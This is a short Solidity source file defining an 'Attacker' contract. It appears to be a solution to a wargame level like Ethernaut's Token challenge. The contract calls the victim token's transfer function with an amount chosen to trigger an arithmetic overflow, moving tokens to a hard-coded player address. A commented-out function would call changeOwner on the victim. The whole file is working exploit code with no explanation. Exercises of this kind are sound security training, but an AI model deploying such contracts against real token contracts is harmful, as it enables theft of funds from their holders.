// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./token.sol";

contract Attacker {
    Token victimContract; //Contractname contractvariable
    uint maxInt = 21000 - 1;
    address playerAddress = 0x81215d34367AF48d01E728AfF2976d9Df32fE604;

    // import a contract
    constructor(address tokenAddress) public {
        victimContract = Token(tokenAddress);
    }

    function sendAttackMessage() external {
        // should overflow
        victimContract.transfer(playerAddress, maxInt);
    }

    // function sendAttackerMessage(address _attackerAddress) external{
    //   victimContract.changeOwner(_attackerAddress);
    // }
}
